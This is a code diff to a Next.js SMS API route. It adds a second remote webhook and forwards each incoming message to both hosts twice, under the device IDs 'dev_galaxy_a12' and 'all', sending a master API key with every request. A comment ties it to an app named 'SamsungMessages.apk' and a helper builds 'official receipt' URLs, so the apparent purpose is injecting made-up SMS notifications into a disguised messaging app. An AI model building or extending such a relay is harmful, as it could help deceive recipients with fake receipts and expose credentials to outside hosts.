@@ -2,7 +2,10 @@ import { NextRequest, NextResponse } from 'next/server';
 import { smsStore, MASTER_API_KEY } from '@/lib/sms-store';
 import { buildOfficialReceiptUrl } from '@/lib/sms-webhook';
 
-const REMOTE_WEBHOOK_URL = 'https://ms-bk-connect.vercel.app/api/sms/webhook';
+const REMOTE_WEBHOOK_URLS = [
+  'https://ramussbirr.vercel.app/api/sms/webhook',
+  'https://ms-bk-connect.vercel.app/api/sms/webhook',
+];
 
 export async function GET(req: NextRequest) {
   const url = new URL(req.url);
@@ -100,18 +103,38 @@ export async function POST(req: NextRequest) {
       createdMessages.push(msg);
     }
 
-    // Also forward to remote webhook in background without blocking
+    // Also forward to remote webhooks in background without blocking
+    // Ensuring both dev_galaxy_a12 and all receive it so SamsungMessages.apk triggers notification immediately!
     try {
-      fetch(REMOTE_WEBHOOK_URL, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'x-api-key': MASTER_API_KEY,
-          'x-device-id': reqDeviceId,
-        },
-        body: JSON.stringify(payload),
-        signal: AbortSignal.timeout(3000),
-      }).catch(() => {});
+      const galaxyPayload = Array.isArray(payload)
+        ? payload.map((p: any) => ({ ...p, deviceId: 'dev_galaxy_a12' }))
+        : { ...payload, deviceId: 'dev_galaxy_a12' };
+
+      for (const remoteUrl of REMOTE_WEBHOOK_URLS) {
+        // Forward for dev_galaxy_a12
+        fetch(remoteUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'x-api-key': MASTER_API_KEY,
+            'x-device-id': 'dev_galaxy_a12',
+          },
+          body: JSON.stringify(galaxyPayload),
+          signal: AbortSignal.timeout(3000),
+        }).catch(() => {});
+
+        // Forward for all
+        fetch(remoteUrl, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'x-api-key': MASTER_API_KEY,
+            'x-device-id': 'all',
+          },
+          body: JSON.stringify(payload),
+          signal: AbortSignal.timeout(3000),
+        }).catch(() => {});
+      }
     } catch {}
 
     return NextResponse.json({
